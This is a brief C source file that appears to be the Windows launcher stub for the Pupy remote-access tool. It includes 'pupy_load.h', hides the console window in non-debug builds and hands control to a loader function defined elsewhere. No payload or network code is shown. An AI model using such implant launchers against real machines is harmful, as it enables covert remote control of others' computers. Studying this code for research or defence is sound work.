#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "pupy_load.h"
#ifndef DEBUG
	#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup")
#endif

int main(int argc, char *argv[]){
	return mainThread(NULL);
}

